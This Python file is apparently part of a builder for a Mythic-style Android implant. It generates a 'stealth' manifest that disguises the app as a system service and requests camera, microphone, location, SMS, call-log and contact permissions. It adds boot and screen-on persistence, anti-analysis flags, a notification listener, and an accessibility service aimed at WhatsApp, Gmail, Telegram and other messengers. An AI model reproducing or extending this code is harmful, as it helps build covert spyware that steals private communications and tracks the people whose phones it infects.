#!/usr/bin/env python3
"""
manifest_editor.py - Enhanced Android Manifest Editor for Android 14/15/16
Includes Privacy Sandbox compatibility, enhanced stealth, and modern evasion
"""

import os
import sys
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Set
import json
import uuid

class ManifestEditor:
    def __init__(self, build_params: Dict):
        self.build_params = build_params
        self.namespace = "{http://schemas.android.com/apk/res/android}"
        self.tools_namespace = "{http://schemas.android.com/tools}"
        self.target_sdk = min(int(build_params.get("target_android_version", "34")), 34)  # Cap at API 34 for now
        
        # Register namespaces
        ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
        ET.register_namespace('tools', 'http://schemas.android.com/tools')
        ET.register_namespace('auto', 'http://schemas.android.com/apk/res-auto')

    def create_stealth_manifest(self, package_name: str, app_name: str) -> str:
        """Create enhanced stealth AndroidManifest.xml for Android 14+"""
        root = ET.Element('manifest')
        root.set('xmlns:android', 'http://schemas.android.com/apk/res/android')
        root.set('xmlns:tools', 'http://schemas.android.com/tools')
        root.set('xmlns:auto', 'http://schemas.android.com/apk/res-auto')
        root.set('package', package_name)
        root.set(f'{self.namespace}versionCode', '1')
        root.set(f'{self.namespace}versionName', '1.0')
        root.set(f'{self.namespace}compileSdkVersion', str(self.target_sdk))

        # Android 14+ specific attributes
        root.set(f'{self.namespace}installLocation', 'auto')
        
        # Add enhanced permissions for Android 14+
        self._add_enhanced_permissions(root)
        
        # Add features with Android 14+ compatibility
        self._add_enhanced_features(root)
        
        # Create application with advanced stealth
        application = self._create_advanced_stealth_application(root, app_name)
        
        # Add agent components with Android 14+ compatibility
        self._add_enhanced_agent_components(application)
        
        return self._format_manifest(root)

    def _add_enhanced_permissions(self, root: ET.Element):
        """Enhanced permissions for Android 14/15/16 compatibility"""
        
        # Core permissions
        core_permissions = [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.WAKE_LOCK",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION",
            "android.permission.FOREGROUND_SERVICE_CAMERA",
            "android.permission.FOREGROUND_SERVICE_MICROPHONE",
            "android.permission.FOREGROUND_SERVICE_LOCATION",
        ]

        # Android 14+ specific permissions
        android14_permissions = [
            "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
            "android.permission.USE_FULL_SCREEN_INTENT",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.SCHEDULE_EXACT_ALARM",
            "android.permission.USE_EXACT_ALARM",
        ]

        # Privacy-sensitive permissions with Android 14+ handling
        sensitive_permissions = [
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO", 
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_CALL_LOG",
            "android.permission.WRITE_CALL_LOG",
        ]

        # Storage permissions with scoped storage compliance
        storage_permissions = [
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO", 
            "android.permission.READ_MEDIA_AUDIO",
        ]

        # Overlay and accessibility (high scrutiny in Android 14+)
        overlay_permissions = [
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
        ]

        all_permissions = core_permissions + android14_permissions + sensitive_permissions + storage_permissions + overlay_permissions

        existing_permissions = set()
        for perm in root.findall('uses-permission'):
            name = perm.get(f'{self.namespace}name')
            if name:
                existing_permissions.add(name)

        for permission in all_permissions:
            if permission not in existing_permissions:
                perm_elem = ET.SubElement(root, 'uses-permission')
                perm_elem.set(f'{self.namespace}name', permission)
                
                # Add maxSdkVersion for deprecated permissions
                if permission in ["android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"]:
                    perm_elem.set(f'{self.namespace}maxSdkVersion', '32')
                
                # Add Android 14+ specific attributes
                if permission in sensitive_permissions:
                    perm_elem.set(f'{self.tools_namespace}node', 'replace')

    def _create_advanced_stealth_application(self, root: ET.Element, app_name: str) -> ET.Element:
        """Create advanced stealth application for Android 14+"""
        application = ET.SubElement(root, 'application')
        
        # Basic stealth attributes
        application.set(f'{self.namespace}allowBackup', 'false')
        application.set(f'{self.namespace}allowClearUserData', 'false')
        application.set(f'{self.namespace}label', app_name)
        application.set(f'{self.namespace}theme', '@android:style/Theme.DeviceDefault.DayNight')
        application.set(f'{self.namespace}hardwareAccelerated', 'true')
        application.set(f'{self.namespace}largeHeap', 'true')
        application.set(f'{self.namespace}usesCleartextTraffic', 'true')
        application.set(f'{self.namespace}networkSecurityConfig', '@xml/network_security_config')
        application.set(f'{self.namespace}requestLegacyExternalStorage', 'true')
        application.set(f'{self.namespace}preserveLegacyExternalStorage', 'true')
        
        # Android 14+ specific stealth attributes
        application.set(f'{self.namespace}dataExtractionRules', '@xml/data_extraction_rules')
        application.set(f'{self.namespace}enableOnBackInvokedCallback', 'true')
        application.set(f'{self.namespace}localeConfig', '@xml/locales_config')
        
        # Advanced anti-analysis
        application.set(f'{self.namespace}debuggable', 'false')
        application.set(f'{self.namespace}allowDebugging', 'false')
        application.set(f'{self.namespace}testOnly', 'false')
        application.set(f'{self.namespace}extractNativeLibs', 'false')  # Prevents easy native lib extraction
        
        # Hide from recents and disable screenshots
        application.set(f'{self.namespace}allowTaskReparenting', 'false')
        
        # Custom application class for stealth initialization
        application.set(f'{self.namespace}name', 'com.android.systemservice.StealthApplication')
        
        return application

    def _add_enhanced_agent_components(self, application: ET.Element):
        """Add enhanced agent components for Android 14+ compatibility"""
        
        # Main agent service with enhanced foreground service types
        service = ET.SubElement(application, 'service')
        service.set(f'{self.namespace}name', 'com.android.systemservice.MythicAgentService')
        service.set(f'{self.namespace}enabled', 'true')
        service.set(f'{self.namespace}exported', 'false')
        service.set(f'{self.namespace}isolatedProcess', 'false')
        service.set(f'{self.namespace}foregroundServiceType', 'dataSync|mediaProjection|camera|microphone|location')
        service.set(f'{self.namespace}stopWithTask', 'false')
        service.set(f'{self.namespace}directBootAware', 'true')
        
        # Enhanced boot receiver with multiple trigger points
        receiver = ET.SubElement(application, 'receiver')
        receiver.set(f'{self.namespace}name', 'com.android.systemservice.EnhancedBootReceiver')
        receiver.set(f'{self.namespace}enabled', 'true')
        receiver.set(f'{self.namespace}exported', 'true')
        receiver.set(f'{self.namespace}directBootAware', 'true')
        
        intent_filter = ET.SubElement(receiver, 'intent-filter')
        intent_filter.set(f'{self.namespace}priority', '1000')
        
        # Multiple boot triggers for reliability
        boot_actions = [
            'android.intent.action.BOOT_COMPLETED',
            'android.intent.action.QUICKBOOT_POWERON',
            'android.intent.action.MY_PACKAGE_REPLACED',
            'android.intent.action.PACKAGE_REPLACED',
            'android.intent.action.USER_PRESENT',
            'android.intent.action.SCREEN_ON',
        ]
        
        for action in boot_actions:
            action_elem = ET.SubElement(intent_filter, 'action')
            action_elem.set(f'{self.namespace}name', action)
        
        # Add data element for package replace events
        if 'PACKAGE_REPLACED' in str(intent_filter):
            data_elem = ET.SubElement(intent_filter, 'data')
            data_elem.set(f'{self.namespace}scheme', 'package')

        # Enhanced accessibility service for Android 14+
        if self.build_params.get("Enable Overlay Module", False):
            accessibility_service = ET.SubElement(application, 'service')
            accessibility_service.set(f'{self.namespace}name', 'com.android.systemservice.EnhancedAccessibilityService')
            accessibility_service.set(f'{self.namespace}enabled', 'true')
            accessibility_service.set(f'{self.namespace}exported', 'false')
            accessibility_service.set(f'{self.namespace}permission', 'android.permission.BIND_ACCESSIBILITY_SERVICE')
            accessibility_service.set(f'{self.namespace}directBootAware', 'true')
            
            acc_filter = ET.SubElement(accessibility_service, 'intent-filter')
            acc_action = ET.SubElement(acc_filter, 'action')
            acc_action.set(f'{self.namespace}name', 'android.accessibilityservice.AccessibilityService')
            
            # Enhanced accessibility metadata
            meta_data = ET.SubElement(accessibility_service, 'meta-data')
            meta_data.set(f'{self.namespace}name', 'android.accessibilityservice')
            meta_data.set(f'{self.namespace}resource', '@xml/enhanced_accessibility_config')

        # Notification listener service for Android 14+
        notification_service = ET.SubElement(application, 'service')
        notification_service.set(f'{self.namespace}name', 'com.android.systemservice.NotificationListenerService')
        notification_service.set(f'{self.namespace}enabled', 'true')
        notification_service.set(f'{self.namespace}exported', 'false')
        notification_service.set(f'{self.namespace}permission', 'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE')
        
        notif_filter = ET.SubElement(notification_service, 'intent-filter')
        notif_action = ET.SubElement(notif_filter, 'action')
        notif_action.set(f'{self.namespace}name', 'android.service.notification.NotificationListenerService')

    def create_enhanced_accessibility_config(self) -> str:
        """Create enhanced accessibility configuration for Android 14+"""
        config = f'''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility|flagReportViewIds|flagRequestFilterKeyEvents"
    android:accessibilityFeedbackType="feedbackSpoken|feedbackHaptic|feedbackAudible|feedbackVisual|feedbackGeneric"
    android:canRetrieveWindowContent="true"
    android:canRequestTouchExplorationMode="true"
    android:canRequestEnhancedWebAccessibility="true"
    android:canRequestFilterKeyEvents="true"
    android:notificationTimeout="0"
    android:packageNames="com.whatsapp,com.instagram.android,com.google.android.gm,com.facebook.katana,com.snapchat.android,com.twitter.android,com.viber.voip,com.skype.raider,com.discord,com.telegram.messenger"
    android:settingsActivity="com.android.systemservice.AccessibilitySettingsActivity" />'''
        return config

    def create_enhanced_network_security_config(self) -> str:
        """Enhanced network security configuration for Android 14+"""
        config = '''<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">localhost</domain>
        <domain includeSubdomains="true">10.0.0.0/8</domain>
        <domain includeSubdomains="true">172.16.0.0/12</domain>
        <domain includeSubdomains="true">192.168.0.0/16</domain>
        <domain includeSubdomains="true">127.0.0.1</domain>
        <trust-anchors cleartextTrafficPermitted="true">
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </domain-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
</network-security-config>'''
        return config

    def create_data_extraction_rules(self) -> str:
        """Create data extraction rules for Android 14+ privacy compliance"""
        return '''<?xml version="1.0" encoding="utf-8"?>
<data-extraction-rules>
    <cloud-backup>
        <exclude domain="root" />
        <exclude domain="database" />
        <exclude domain="file" />
        <exclude domain="external" />
    </cloud-backup>
    <device-transfer>
        <exclude domain="root" />
        <exclude domain="database" />
        <exclude domain="file" />
        <exclude domain="external" />
    </device-transfer>
</data-extraction-rules>'''

    def create_locales_config(self) -> str:
        """Create locale configuration for Android 14+"""
        return '''<?xml version="1.0" encoding="utf-8"?>
<locale-config xmlns:android="http://schemas.android.com/apk/res/android">
    <locale android:name="en"/>
    <locale android:name="es"/>
    <locale android:name="fr"/>
    <locale android:name="de"/>
    <locale android:name="zh"/>
    <locale android:name="ar"/>
    <locale android:name="hi"/>
    <locale android:name="pt"/>
    <locale android:name="ru"/>
    <locale android:name="ja"/>
</locale-config>'''
